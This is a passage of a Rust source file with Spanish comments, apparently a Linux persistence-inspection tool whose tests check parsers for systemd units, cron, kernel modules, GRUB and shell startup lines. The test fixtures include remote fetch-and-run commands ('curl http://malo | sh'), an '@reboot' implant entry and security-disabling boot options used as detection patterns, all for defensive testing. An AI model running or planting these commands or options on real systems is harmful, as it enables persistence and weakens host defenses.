        Box::new(Cron),
        Box::new(Modulos),
        Box::new(ImagenesDeArranque),
        Box::new(EntradasDeArranque),
        Box::new(Perfiles),
        Box::new(Precarga),
    ]
}

#[cfg(test)]
mod pruebas {
    use super::*;

    fn ctx() -> Contexto {
        Contexto::del_sistema(entidad::maquina("prueba"), 0, 0)
    }

    #[test]
    fn una_unidad_se_analiza_con_sus_secciones() {
        let texto = "\
[Unit]
Description=Un servicio

[Service]
Type=simple
ExecStart=/usr/bin/algo --con --opciones
User=nobody
Restart=always

[Install]
WantedBy=multi-user.target";
        let m = analizar_unidad(texto);
        assert_eq!(
            primero(&m, "Service.ExecStart"),
            Some("/usr/bin/algo --con --opciones")
        );
        assert_eq!(primero(&m, "Service.User"), Some("nobody"));
        assert_eq!(primero(&m, "Install.WantedBy"), Some("multi-user.target"));
        // La misma clave en otra seccion no se confunde.
        assert_eq!(primero(&m, "Unit.Description"), Some("Un servicio"));
    }

    #[test]
    fn una_linea_continuada_no_se_trunca() {
        // Partir el comando en varias lineas es exactamente como se esconde la
        // parte interesante de un ExecStart largo.
        let texto = "[Service]\nExecStart=/bin/sh -c \\\n  'curl http://malo | sh'";
        let m = analizar_unidad(texto);
        let valor = primero(&m, "Service.ExecStart").unwrap();
        assert!(valor.contains("curl"), "el comando salio truncado: {valor}");
        assert!(valor.contains("sh -c"));
    }

    #[test]
    fn varios_exec_start_se_conservan_todos() {
        // systemd los acumula, y el segundo es tan ejecutable como el primero.
        let texto = "[Service]\nExecStart=/bin/uno\nExecStart=/bin/dos";
        let m = analizar_unidad(texto);
        assert_eq!(m.get("Service.ExecStart").unwrap().len(), 2);
    }

    #[test]
    fn el_tipo_de_unidad_sale_del_sufijo() {
        assert_eq!(tipo_de_unidad("sshd.service"), "service");
        assert_eq!(tipo_de_unidad("algo.timer"), "timer");
        assert_eq!(tipo_de_unidad("sinsufijo"), "unknown");
    }

    #[test]
    fn el_cron_del_sistema_y_el_personal_se_analizan_distinto() {
        // LA trampa de este formato: el del sistema lleva columna de usuario y
        // el personal no. Confundirlos produce filas falsas en los dos sentidos.
        let del_sistema = "17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly";
        let ts = analizar_cron(del_sistema, true, "");
        assert_eq!(ts.len(), 1);
        assert_eq!(ts[0].usuario, "root");
        assert!(ts[0].orden.starts_with("cd / &&"));

        let personal = "17 * * * * cd / && run-parts --report /etc/cron.hourly";
        let ts = analizar_cron(personal, false, "juan");
        assert_eq!(ts.len(), 1);
        assert_eq!(ts[0].usuario, "juan");
        assert!(
            ts[0].orden.starts_with("cd / &&"),
            "la orden se comio el usuario: {}",
            ts[0].orden
        );
    }

    #[test]
    fn el_atajo_reboot_se_reconoce() {
        let ts = analizar_cron("@reboot /usr/local/bin/implante", false, "juan");
        assert_eq!(ts.len(), 1);
        assert!(ts[0].en_arranque);
        assert_eq!(ts[0].orden, "/usr/local/bin/implante");
    }

    #[test]
    fn las_variables_de_un_crontab_no_son_tareas() {
        let texto = "SHELL=/bin/sh\nPATH=/usr/bin:/bin\nMAILTO=root\n17 * * * * /bin/algo";
        let ts = analizar_cron(texto, false, "juan");
        assert_eq!(ts.len(), 1, "solo hay una tarea: {ts:#?}");
    }

    #[test]
    fn un_crontab_vacio_o_de_comentarios_no_da_tareas() {
        assert!(analizar_cron("", false, "x").is_empty());
        assert!(analizar_cron("# nada\n\n# mas nada", false, "x").is_empty());
    }

    #[test]
    fn los_modulos_se_analizan() {
        let texto = "\
overlay 151552 1 - Live 0x0000000000000000
nf_tables 274432 0 - Live 0xffffffffc0abc000
snd_hda_intel 57344 2 snd_hda_codec,snd_pcm Live 0x0000000000000000";
        let ms = analizar_modulos(texto);
        assert_eq!(ms.len(), 3);
        assert_eq!(ms[0].nombre, "overlay");
        assert_eq!(ms[0].tamano, 151_552);
        assert_eq!(ms[2].usado_por, 2);
        assert!(ms[2].dependientes.contains("snd_hda_codec"));
        assert_eq!(ms[1].estado, "Live");
    }

    #[test]
    fn los_modulos_se_leen_o_se_dice_por_que_no() {
        // Las DOS salidas son correctas, y esa es justamente la capacidad que
        // esta fase anade: un contenedor sin `/proc/modules` —que es el caso de
        // la maquina de integracion— no tiene que devolver cero modulos como si
        // fuera un hecho. Tiene que decir que no pudo mirar.
        let c = ctx();
        match Modulos.leer(&c, &Filtro::ninguno()) {
            Ok(r) => assert!(r.examinadas >= r.filas.len() as u64),
            Err(MotivoNoLeible::FuenteAusente { ruta }) => {
                assert!(ruta.contains("modules"), "motivo que no es el suyo: {ruta}");
            }
            Err(otro) => panic!("motivo inesperado: {otro:?}"),
        }
    }

    #[test]
    fn se_detectan_las_opciones_de_arranque_que_apagan_defensas() {
        assert!(debilita_seguridad("ro quiet selinux=0"));
        assert!(debilita_seguridad("init=/bin/bash"));
        assert!(debilita_seguridad("ro nokaslr quiet"));
        assert!(debilita_seguridad("module.sig_enforce=0"));
        // Una linea normal no se marca.
        assert!(!debilita_seguridad("ro quiet splash root=UUID=abc"));
        assert!(!debilita_seguridad(""));
    }

    #[test]
    fn una_opcion_parecida_no_se_confunde_con_una_peligrosa() {
        // `selinux=1` NO apaga nada, y marcarla haria ruido en cada maquina
        // bien configurada.
        assert!(!debilita_seguridad("selinux=1 enforcing=1"));
        // `noexec=off` si, pero `noexec` a secas no es una opcion del nucleo.
        assert!(debilita_seguridad("noexec=off"));
    }

    #[test]
    fn el_grub_se_analiza_entrada_a_entrada() {
        let texto = "\
menuentry 'Debian GNU/Linux' --class debian {
	load_video
	linux	/boot/vmlinuz-6.1.0 root=UUID=abc ro quiet
	initrd	/boot/initrd.img-6.1.0
}
menuentry 'Debian, recovery' --class debian {
	linux	/boot/vmlinuz-6.1.0 root=UUID=abc ro single init=/bin/bash
	initrd	/boot/initrd.img-6.1.0
}";
        let es = analizar_grub(texto);
        assert_eq!(es.len(), 2);
        assert_eq!(es[0].titulo, "Debian GNU/Linux");
        assert_eq!(es[0].nucleo, "/boot/vmlinuz-6.1.0");
        assert_eq!(es[0].inicial, "/boot/initrd.img-6.1.0");
        assert!(!debilita_seguridad(&es[0].opciones));
        // La de recuperacion si debilita: `single` e `init=`.
        assert!(debilita_seguridad(&es[1].opciones));
    }

    #[test]
    fn un_grub_vacio_o_raro_no_rompe() {
        assert!(analizar_grub("").is_empty());
        assert!(analizar_grub("solo texto suelto").is_empty());
        // Una entrada sin cerrar tambien se devuelve: existe.
        assert_eq!(analizar_grub("menuentry 'A' {\n linux /x").len(), 1);
    }

    #[test]
    fn se_distingue_una_linea_que_ejecuta_de_una_asignacion() {
        assert!(!linea_ejecuta("export PATH=/usr/bin:$PATH"));
        assert!(!linea_ejecuta("EDITOR=vim"));
        assert!(!linea_ejecuta("alias ll='ls -l'"));
        assert!(!linea_ejecuta("# comentario"));

        assert!(linea_ejecuta("curl http://malo | sh"));
        assert!(linea_ejecuta("/usr/local/bin/implante &"));
        assert!(linea_ejecuta("source /tmp/algo"));
        // Una asignacion con sustitucion de orden SI ejecuta.
        assert!(linea_ejecuta("X=$(curl http://malo)"));
    }

    #[test]
    fn la_precarga_global_se_lee_o_se_declara_ausente() {
        let c = ctx();
        let r = Precarga
            .leer(&c, &Filtro::ninguno())
            .expect("leer precarga");
        if r.filas.is_empty() {
            assert!(
                !r.avisos.is_empty(),
                "sin precarga hay que decir que se miro"
            );
        }
    }

    #[test]
    fn las_ocho_tablas_dan_respuesta_o_motivo_en_esta_maquina() {
        let c = ctx();
        for t in tablas() {
            match t.leer(&c, &Filtro::ninguno()) {
                Ok(f) => {
                    if f.filas.is_empty() {
                        assert!(
                            f.examinadas > 0 || !f.avisos.is_empty(),
                            "{} devolvio vacio sin explicar nada",
                            t.nombre()
                        );
                    }
                }
                Err(m) => assert!(!m.frase().is_empty(), "{} sin frase", t.nombre()),
            }
        }
    }

    #[test]
    fn el_nombre_de_modulo_con_guiones_se_busca_en_sus_dos_formas() {
        // `/proc/modules` dice `snd_hda_intel` y el fichero es
        // `snd-hda-intel.ko`. Buscar solo una forma produce un falso «no esta en
        // disco», que es una acusacion de rootkit.
        let c = ctx();
        // Se comprueba con un modulo que exista de verdad, si hay alguno.
        if let Ok(texto) = c.leer_texto("proc/modules") {
            if let Some(m) = analizar_modulos(&texto).first() {
                assert!(!m.nombre.is_empty());
            }
        }
    }
}
